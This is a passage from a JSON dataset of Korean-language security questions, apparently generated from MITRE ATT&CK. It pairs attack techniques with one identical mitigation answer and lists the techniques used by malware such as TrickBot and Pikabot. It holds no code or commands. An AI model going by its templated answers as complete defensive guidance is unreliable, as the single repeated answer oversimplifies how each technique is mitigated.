        "attack_id": "attack-pattern--73b24a10-6bf4-4af1-a81e-67b8bcb6c4e6",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Dynamic Resolution 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Multi-Stage Channels 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Application Layer Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Exfiltration Over C2 Channel 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Ingress Tool Transfer 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "ARP Cache Poisoning 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Non-Application Layer Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Web Service 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Data Encoding 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Domain Generation Algorithms 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "User Execution 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "SNMP (MIB Dump) 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Malicious Link 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Network Device Configuration Dump 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Symmetric Cryptography 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Network Service Discovery 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Lateral Tool Transfer 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Data Obfuscation 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "DHCP Spoofing 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Malicious Copy and Paste 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--e261a979-f354-41a8-963e-6cadac27c4bf",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Spearphishing Attachment 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Exfiltration Over Alternative Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Adversary-in-the-Middle 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Asymmetric Cryptography 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Malicious Image 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Junk Data 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Template Injection 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "LLMNR/NBT-NS Poisoning and SMB Relay 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Dead Drop Resolver 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Evil Twin 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--48b836c6-e4ca-435a-82a3-29c03e5b492e",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Internal Proxy 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Data Transfer Size Limits 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Mail Protocols 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "HDoor 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "HDoor는 Network Service Discovery, Disable or Modify Tools 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "HDoor",
        "attack_patterns": [
          "Network Service Discovery",
          "Disable or Modify Tools"
        ]
      }
    },
    {
      "question": "TrickBot 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "TrickBot는 Encrypted/Encoded File, System Network Configuration Discovery, Domain Trust Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "TrickBot",
        "attack_patterns": [
          "Encrypted/Encoded File",
          "System Network Configuration Discovery",
          "Domain Trust Discovery",
          "Spearphishing Attachment",
          "Credentials from Web Browsers",
          "Web Protocols",
          "Exploitation of Remote Services",
          "System Information Discovery",
          "System Owner/User Discovery",
          "Scheduled Task",
          "Component Object Model",
          "Browser Session Hijacking",
          "Bootkit",
          "Native API",
          "PowerShell",
          "Exfiltration Over C2 Channel",
          "Fallback Channels",
          "VNC",
          "Obfuscated Files or Information",
          "Windows Service",
          "Software Packing",
          "Credentials In Files",
          "Malicious File",
          "Symmetric Cryptography",
          "Local Account",
          "Spearphishing Link",
          "Standard Encoding",
          "Network Share Discovery",
          "Data from Local System",
          "Disable or Modify Tools",
          "Permission Groups Discovery",
          "Credentials in Registry",
          "Process Discovery",
          "Windows Command Shell",
          "Email Account",
          "Time Based Checks",
          "Remote Access Tools",
          "Masquerading",
          "Firmware Corruption",
          "Deobfuscate/Decode Files or Information",
          "Remote System Discovery",
          "Non-Standard Port",
          "Password Managers",
          "Credential Stuffing",
          "File and Directory Discovery",
          "Code Signing",
          "Modify Registry",
          "System Service Discovery",
          "Credential API Hooking",
          "Ingress Tool Transfer",
          "Process Injection",
          "Process Hollowing",
          "External Proxy",
          "Registry Run Keys / Startup Folder",
          "Hidden Window"
        ]
      }
    },
    {
      "question": "cd00r 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "cd00r는 Port Knocking, Network Sniffing, System Network Configuration Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "cd00r",
        "attack_patterns": [
          "Port Knocking",
          "Network Sniffing",
          "System Network Configuration Discovery",
          "Non-Application Layer Protocol"
        ]
      }
    },
    {
      "question": "PowerDuke 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "PowerDuke는 Registry Run Keys / Startup Folder, Windows Command Shell, Ingress Tool Transfer 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "PowerDuke",
        "attack_patterns": [
          "Registry Run Keys / Startup Folder",
          "Windows Command Shell",
          "Ingress Tool Transfer",
          "NTFS File Attributes",
          "File Deletion",
          "System Time Discovery",
          "Process Discovery",
          "System Owner/User Discovery",
          "Data Destruction",
          "Application Window Discovery",
          "File and Directory Discovery",
          "System Information Discovery",
          "Steganography",
          "Rundll32",
          "System Network Configuration Discovery"
        ]
      }
    },
    {
      "question": "EKANS 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "EKANS는 Match Legitimate Resource Name or Location, Obfuscated Files or Information, Disable or Modify Tools 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "EKANS",
        "attack_patterns": [
          "Match Legitimate Resource Name or Location",
          "Obfuscated Files or Information",
          "Disable or Modify Tools",
          "Service Stop",
          "System Network Configuration Discovery",
          "Windows Management Instrumentation",
          "Inhibit System Recovery",
          "Data Encrypted for Impact",
          "Process Discovery"
        ]
      }
    },
    {
      "question": "BLINDINGCAN 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "BLINDINGCAN는 Deobfuscate/Decode Files or Information, Symmetric Cryptography, Spearphishing Attachment 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "BLINDINGCAN",
        "attack_patterns": [
          "Deobfuscate/Decode Files or Information",
          "Symmetric Cryptography",
          "Spearphishing Attachment",
          "File and Directory Discovery",
          "Local Storage Discovery",
          "Rundll32",
          "Shared Modules",
          "Malicious File",
          "Timestomp",
          "System Network Configuration Discovery",
          "Exfiltration Over C2 Channel",
          "Software Packing",
          "File Deletion",
          "Code Signing",
          "Encrypted/Encoded File",
          "Standard Encoding",
          "Match Legitimate Resource Name or Location",
          "Data from Local System",
          "Ingress Tool Transfer",
          "Web Protocols",
          "Windows Command Shell",
          "System Information Discovery"
        ]
      }
    },
    {
      "question": "Ninja 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Ninja는 Inter-Process Communication, Non-Standard Encoding, Timestomp 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Ninja",
        "attack_patterns": [
          "Inter-Process Communication",
          "Non-Standard Encoding",
          "Timestomp",
          "Web Protocols",
          "Compression",
          "Process Discovery",
          "Protocol or Service Impersonation",
          "Windows Service",
          "Process Injection",
          "Rundll32",
          "Local Storage Discovery",
          "Internal Proxy",
          "Multi-hop Proxy",
          "Environmental Keying",
          "Data Obfuscation",
          "Deobfuscate/Decode Files or Information",
          "System Information Discovery",
          "Scheduled Transfer",
          "DLL",
          "Symmetric Cryptography",
          "Native API",
          "File and Directory Discovery",
          "Spearphishing via Service",
          "Malicious File",
          "System Network Configuration Discovery",
          "Match Legitimate Resource Name or Location",
          "Non-Application Layer Protocol",
          "Encrypted/Encoded File"
        ]
      }
    },
    {
      "question": "Pikabot 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Pikabot는 System Checks, Registry Run Keys / Startup Folder, Environmental Keying 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Pikabot",
        "attack_patterns": [
          "System Checks",
          "Registry Run Keys / Startup Folder",
          "Environmental Keying",
          "Portable Executable Injection",
          "Embedded Payloads",
          "Deobfuscate/Decode Files or Information",
          "Standard Encoding",
          "Reflective Code Loading",
          "Steganography",
          "Fileless Storage",
          "Native API",
          "System Information Discovery",
          "Exfiltration Over C2 Channel",
          "Local Account",
          "Symmetric Cryptography",
          "Non-Standard Port",
          "Debugger Evasion",
          "Thread Execution Hijacking",
          "Domain Trust Discovery",
          "Windows Command Shell",
          "System Network Configuration Discovery"
        ]
      }
    },
    {
      "question": "Wiarp 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Wiarp는 Windows Service, Process Injection, Windows Command Shell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Wiarp",
        "attack_patterns": [
          "Windows Service",
          "Process Injection",
          "Windows Command Shell",
          "Ingress Tool Transfer"
        ]
      }
    },
    {
      "question": "RCSession 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RCSession는 Bypass User Account Control, Windows Command Shell, Modify Registry 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RCSession",
        "attack_patterns": [
          "Bypass User Account Control",
          "Windows Command Shell",
          "Modify Registry",
          "DLL",
          "Masquerading",
          "System Information Discovery",
          "Fileless Storage",
          "Non-Application Layer Protocol",
          "Data from Local System",
          "Compression",
          "Registry Run Keys / Startup Folder",
          "File Deletion",
          "System Owner/User Discovery",
          "Web Protocols",
          "Native API",
          "Ingress Tool Transfer",
          "Keylogging",
          "Screen Capture",
          "Msiexec",
          "Process Discovery",
          "Process Hollowing",
          "Encrypted Channel"
        ]
      }
    },
    {
      "question": "Spark 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Spark는 Web Protocols, Exfiltration Over C2 Channel, Deobfuscate/Decode Files or Information 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Spark",
        "attack_patterns": [
          "Web Protocols",
          "Exfiltration Over C2 Channel",
          "Deobfuscate/Decode Files or Information",
          "System Owner/User Discovery",
          "User Activity Based Checks",
          "System Information Discovery",
          "Standard Encoding",
          "Windows Command Shell",
          "System Language Discovery",
          "Software Packing"
        ]
      }
    },
    {
      "question": "QuietSieve 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "QuietSieve는 Screen Capture, Network Share Discovery, Data from Local System 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "QuietSieve",
        "attack_patterns": [
          "Screen Capture",
          "Network Share Discovery",
          "Data from Local System",
          "Peripheral Device Discovery",
          "File and Directory Discovery",
          "Internet Connection Discovery",
          "Ingress Tool Transfer",
          "Web Protocols",
          "Hidden Window"
        ]
      }
    },
    {
      "question": "SynAck 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "SynAck는 Process Discovery, System Language Discovery, System Service Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "SynAck",
        "attack_patterns": [
          "Process Discovery",
          "System Language Discovery",
          "System Service Discovery",
          "Data Encrypted for Impact",
          "Native API",
          "Query Registry",
          "System Information Discovery",
          "Process Doppelgänging",
          "System Checks",
          "System Owner/User Discovery",
          "Modify Registry",
          "Clear Windows Event Logs",
          "Obfuscated Files or Information",
          "File and Directory Discovery"
        ]
      }
    },
    {
      "question": "Bumblebee 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Bumblebee는 Component Object Model, File Deletion, Debugger Evasion 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Bumblebee",
        "attack_patterns": [
          "Component Object Model",
          "File Deletion",
          "Debugger Evasion",
          "Malicious File",
          "PowerShell",
          "Scheduled Task",
          "Spearphishing Attachment",
          "Malicious Link",
          "Process Discovery",
          "Bypass User Account Control",
          "Symmetric Cryptography",
          "Query Registry",
          "Shared Modules",
          "Obfuscated Files or Information",
          "Native API",
          "Process Injection",
          "Match Legitimate Resource Name or Location",
          "Rundll32",
          "Standard Encoding",
          "Fallback Channels",
          "Ingress Tool Transfer",
          "Spearphishing Link",
          "Web Service",
          "Virtualization/Sandbox Evasion",
          "Visual Basic",
          "Asynchronous Procedure Call",
          "Security Software Discovery",
          "Data from Local System",
          "Odbcconf",
          "Time Based Checks",
          "Archive Collected Data",
          "Dynamic-link Library Injection",
          "Deobfuscate/Decode Files or Information",
          "System Checks",
          "Windows Command Shell",
          "Exfiltration Over C2 Channel",
          "Windows Management Instrumentation",
          "System Owner/User Discovery",
          "System Information Discovery"
        ]
      }
    },
    {
      "question": "MURKYTOP 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "MURKYTOP는 Local Account, Network Service Discovery, Network Share Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "MURKYTOP",
        "attack_patterns": [
          "Local Account",
          "Network Service Discovery",
          "Network Share Discovery",
          "At",
          "Permission Groups Discovery",
          "Windows Command Shell",
          "File Deletion",
          "System Information Discovery",
          "Remote System Discovery"
        ]
      }
    },
    {
      "question": "AcidRain 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "AcidRain는 File and Directory Discovery, Disk Content Wipe, Data Destruction 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "AcidRain",
        "attack_patterns": [
          "File and Directory Discovery",
          "Disk Content Wipe",
          "Data Destruction",
          "System Shutdown/Reboot"
        ]
      }
    },
    {
      "question": "GRIFFON 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "GRIFFON는 PowerShell, Scheduled Task, Registry Run Keys / Startup Folder 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "GRIFFON",
        "attack_patterns": [
          "PowerShell",
          "Scheduled Task",
          "Registry Run Keys / Startup Folder",
          "System Information Discovery",
          "JavaScript",
          "System Time Discovery",
          "Domain Groups",
          "Screen Capture"
        ]
      }
    },
    {
      "question": "Exaramel for Windows 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Exaramel for Windows는 Local Data Staging, Masquerade Task or Service, Windows Command Shell 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Exaramel for Windows",
        "attack_patterns": [
          "Local Data Staging",
          "Masquerade Task or Service",
          "Windows Command Shell",
          "Modify Registry",
          "Windows Service",
          "Fileless Storage",
          "Visual Basic",
          "Archive Collected Data"
        ]
      }
    },
    {
      "question": "Amadey 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Amadey는 System Network Configuration Discovery, Web Protocols, System Location Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Amadey",
        "attack_patterns": [
          "System Network Configuration Discovery",
          "Web Protocols",
          "System Location Discovery",
          "System Owner/User Discovery",
          "Deobfuscate/Decode Files or Information",
          "Registry Run Keys / Startup Folder",
          "Modify Registry",
          "Ingress Tool Transfer",
          "System Information Discovery",
          "Mark-of-the-Web Bypass",
          "Exfiltration Over C2 Channel",
          "Data from Local System",
          "Native API",
          "Fast Flux DNS",
          "Security Software Discovery",
          "Obfuscated Files or Information",
          "File and Directory Discovery"
        ]
      }
    },
    {
      "question": "JumbledPath 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "JumbledPath는 Impair Defenses, Archive Collected Data, Hide Infrastructure 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "JumbledPath",
        "attack_patterns": [
          "Impair Defenses",
          "Archive Collected Data",
          "Hide Infrastructure",
          "Multi-Stage Channels",
          "Network Sniffing",
          "Clear Linux or Mac System Logs"
        ]
      }
    },
    {
      "question": "RDFSNIFFER 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "RDFSNIFFER는 Native API, File Deletion, Credential API Hooking 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "RDFSNIFFER",
        "attack_patterns": [
          "Native API",
          "File Deletion",
          "Credential API Hooking"
        ]
      }
    },
    {
      "question": "NICECURL 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "NICECURL는 Web Protocols, Ingress Tool Transfer, Asymmetric Cryptography 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "NICECURL",
        "attack_patterns": [
          "Web Protocols",
          "Ingress Tool Transfer",
          "Asymmetric Cryptography",
          "Command and Scripting Interpreter",
          "File Deletion"
        ]
      }
    },
    {
      "question": "Proxysvc 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Proxysvc는 Data Destruction, Windows Command Shell, System Time Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Proxysvc",
        "attack_patterns": [
          "Data Destruction",
          "Windows Command Shell",
          "System Time Discovery",
          "System Network Configuration Discovery",
          "Query Registry",
          "Process Discovery",
          "Exfiltration Over C2 Channel",
          "System Information Discovery",
          "File and Directory Discovery",
          "Local Storage Discovery",
          "Service Execution",
          "Automated Collection",
          "File Deletion",
          "Web Protocols",
          "Data from Local System"
        ]
      }
    },
    {
      "question": "Orz 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Orz는 Obfuscated Files or Information, Process Hollowing, System Network Configuration Discovery 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Orz",
        "attack_patterns": [
          "Obfuscated Files or Information",
          "Process Hollowing",
          "System Network Configuration Discovery",
          "Modify Registry",
          "Software Discovery",
          "Ingress Tool Transfer",
          "Indicator Removal",
          "Process Discovery",
          "System Information Discovery",
          "Bidirectional Communication",
          "Regsvr32",
          "Windows Command Shell",
          "File and Directory Discovery"
        ]
      }
    },
    {
      "question": "Torisma 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "Torisma는 System Network Configuration Discovery, Web Protocols, Symmetric Cryptography 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "Torisma",
        "attack_patterns": [
          "System Network Configuration Discovery",
          "Web Protocols",
          "Symmetric Cryptography",
          "Software Packing",
          "Deobfuscate/Decode Files or Information",
          "System Network Connections Discovery",
          "Execution Guardrails",
          "Standard Encoding",
          "Exfiltration Over C2 Channel",
          "System Time Discovery",
          "Local Storage Discovery",
          "Native API",
          "Encrypted/Encoded File"
        ]
      }
    },
    {
      "question": "NOKKI 악성코드는 어떤 공격 패턴을 사용하는가?",
      "answer": "NOKKI는 System Information Discovery, Credential API Hooking, File Transfer Protocols 등의 공격 패턴을 사용한다.",
      "difficulty": "medium",
      "type": "malware_attack_chain",
      "metadata": {
        "malware": "NOKKI",
        "attack_patterns": [
          "System Information Discovery",
          "Credential API Hooking",
          "File Transfer Protocols",
          "System Network Configuration Discovery",
          "Local Data Staging",
          "Web Protocols",
          "Deobfuscate/Decode Files or Information",
          "Local Storage Discovery",
          "Rundll32",
          "System Owner/User Discovery",
          "File Deletion",
          "Obfuscated Files or Information",
